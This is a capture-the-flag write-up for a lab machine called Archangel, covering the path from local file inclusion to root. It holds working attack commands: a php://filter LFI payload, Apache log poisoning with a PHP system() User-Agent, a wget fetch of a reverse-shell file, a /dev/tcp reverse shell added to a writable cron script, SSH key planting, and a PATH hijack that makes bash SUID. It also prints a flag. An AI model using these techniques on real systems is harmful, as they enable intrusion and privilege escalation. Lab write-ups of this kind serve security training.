---
description: Writeup.
---

# Archangel

## Get a shell

### 1. Find a different hostname

`mafialive.thm`

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgUof0IjKP5HQsFhJ9LNV%2Fuploads%2FyocVuSx8BimArJoaTwLz%2Fimage.png?alt=media&#x26;token=793a764d-fc67-4ade-a263-14ac7ca4435f" alt=""><figcaption></figcaption></figure>



### 2. Find flag 1

* Add the domain name to `/etc/hosts` as :  `10.10.224.98 mafialive.thm`

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgUof0IjKP5HQsFhJ9LNV%2Fuploads%2F5Fq178sAqPf2PzNKdorZ%2Fimage.png?alt=media&#x26;token=2a7fe2bd-72b6-4211-a84d-17ce00ecfa6e" alt=""><figcaption></figcaption></figure>



### 3. Look for a page under development

`test.php`



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgUof0IjKP5HQsFhJ9LNV%2Fuploads%2FDbXSzGTIBmuSCTqNL1LA%2Fimage.png?alt=media&#x26;token=d7e5566c-e012-41a5-a2a0-aa7b7eb74928" alt=""><figcaption></figcaption></figure>

### 4. Find flag 2

`thm{explo1t1ng_lf1}`

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgUof0IjKP5HQsFhJ9LNV%2Fuploads%2Fq9FYpLyMB6L6T9gVzKo5%2Fimage.png?alt=media&#x26;token=c2db749c-c437-41c6-949c-673564111c2c" alt=""><figcaption></figcaption></figure>

* Looking at the url, it's known to us that we have to exploit LFI
* I tried looking for `/etc/passwd` but seems like we can few files that are under current directory.&#x20;
* If we use `php filter` and convert `test.php` into base64 we can read it.
* Payload : [http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development\_testing/test.php](http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development\_testing/test.php)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgUof0IjKP5HQsFhJ9LNV%2Fuploads%2FVJNjrQXri4be8wMhQKPZ%2Fimage.png?alt=media&#x26;token=5c033655-0479-4fd3-95a0-063d965cb7ec" alt=""><figcaption></figcaption></figure>



### 5. Get user shell & flag.

* The hint said `poison!!.`
* apache log poison it is!!!! (google search)

{% embed url="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/" %}

#### Url poisioning&#x20;

* i used following curl command for the log poision

```bash
└─➜ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log" -H "User-Agent: <?php system(\$_GET['cmd']) ?>"    

```

#### Log poison sucessfull !!

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgUof0IjKP5HQsFhJ9LNV%2Fuploads%2Frv9Olw40QICI9kfQuXvC%2Fimage.png?alt=media&#x26;token=cd9b378d-81b5-4329-a794-52e3bc2482b3" alt=""><figcaption></figcaption></figure>

#### Reverse shell

* I used pentest monkey's revshell&#x20;
* Start a python server in your local system & run the following command :&#x20;
* make sure you change ip & port&#x20;

```bash
└─➜ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=wget+YOUR_IP:PORT/revshell.php" #-H
```

* so i copied the .php file into machines using wget&#x20;
* & now when i visit `MACHINE_IP/revshell.php` i will get a reverse shell

#### Flag

```bash
┌─[ ~/stuff/thm/archangel] [ 10.8.102.180]
└─➜ nc -nvlp 9001                                                                                   [0]
Connection from 10.10.1.211:59838
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:03:46 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /home/archangel/user.txt
<REDACTED>
```



## Root the machine

### 1. Get user 2 flag

* There's a cronjob running the file in `/opt` (found through Linpeas)
* we have full write access on it, so let's edit it & get a stable shell
* I am going to add my public key into the authorized keys of archangel.
* get archangel shell

```bash
www-data@ubuntu:/opt$ echo "sh -i >& /dev/tcp/10.8.102.180/9099 0>&1" >> helloworld.sh
```

* And we got the shelll

```bash
└─➜ nc -nvlp 9099                                                                                                                                                                                             [0]
Connection from 10.10.1.211:41092
sh: 0: can't access tty; job control turned off
$ id
uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)

```



\----------stabalize shell&#x20;

```bash
└─➜ cat ssh.sh                                                                                                                                                                                                [0]
#!/bin/sh
#

mkdir ~/.ssh
chmod 700 ~/.ssh

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC18sGRBGlzuvZK0Koh9FX0TprCBJHe4H/piBsY6a66JaHHaCTAN73A1Sp1gQUEQRZrYBh1d59mHeEUK5IIlD+4slmQTs29mfkmYisTRWKzxyxdaCOrGaphdnVxFyPO4XP86DJQ2ejB/nQiiCsxa9CqVQix/m1C11cbuferNdkLezLWkP2O3VTeFswATTQaScSXu/hSHw3WoXOr1yS3Ceofmf5r1NvEZQC45eEqxa0ACiFBZY75A1EsDIYhsvpNeqbMtjLKq3GoA9TO6HnujGIjFgq5El9fMVDC9bxwNCTKXcvlv3YYKAJqY/fOs2EUj/nqwOj/ynXsTOY5vWM9MIvYtTra32IM1z6OpWKLPUOjJ22W8l6y+XfRfF6TGRNIes0mgclzdjWC9MHqiPGm68hQgF3Zm5PNBtP7n3j3UYzkZJLT2WlOff8osIGMIkROmlbnHxQR6mURgVBU5k+vH/P+iB9zLurB16ptI5vWEXoj6iz6p8Ip+0+sn/0a9hFWyPq9dPbUaRuHA1/Blyh6/7DA3JeOQ79RfCeIZA0JEEumsLDDhfUc7x2kGiSHt0uHZjBDEBM+oZm8dFO4fOXv/7JN1rE60J2zHRMz5YXKWFGMapq3PAAPKXbYW7A5PLjQEr80yEzf38GV1hKyvHI1IdNb21f/P7I08cijowmZ6mUhxQ== heapbytes@pm.me" > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

```

* Start python server

```bash
└─➜ python3 -m http.server 1111                                                                                                                                                                             [130]
Serving HTTP on 0.0.0.0 port 1111 (http://0.0.0.0:1111/) ...
10.10.1.211 - - [17/Sep/2023 15:33:56] "GET /ssh.sh HTTP/1.1" 200 -
```

* Now ssh part.

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgUof0IjKP5HQsFhJ9LNV%2Fuploads%2FStC8nX7gAZJrMJPgNH5F%2Fimage.png?alt=media&#x26;token=1d8e0d9e-116d-47ff-973d-7f5187a124bc" alt=""><figcaption></figcaption></figure>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgUof0IjKP5HQsFhJ9LNV%2Fuploads%2FgcOTyFG2hRhyfD0k6Tee%2Fimage.png?alt=media&#x26;token=d1d833a4-df4f-49bc-a8f0-13ce8b89808d" alt=""><figcaption></figcaption></figure>

### 2. Root flag

```
 Question Hint
certain paths are dangerous
```

* running the binary gives an error&#x20;

```bash
cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
```

* taking note of the hint my guess is that the binary is using relative path so we can create our own `cp` & pwn the machine.

```bash
archangel@ubuntu:/tmp$ nano cp
archangel@ubuntu:/tmp$ cat cp
chmod +s /bin/bash
archangel@ubuntu:/tmp$ chmod 777 cp

```

* i made in `/tmp`
* now let's add our `/tmp` to our path variable

```bash
archangel@ubuntu:/tmp$ export PATH=/tmp:$PATH
archangel@ubuntu:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
archangel@ubuntu:/tmp$

```

#### --------------- ROOT FLAG

```bash
archangel@ubuntu:/tmp$ cd
archangel@ubuntu:~$ cd secret/
archangel@ubuntu:~/secret$ ./backup
archangel@ubuntu:~/secret$ /bin/bash -p

bash-4.4# id
uid=1001(archangel) gid=1001(archangel) euid=0(root) egid=0(root) groups=0(root),1001(archangel)

```

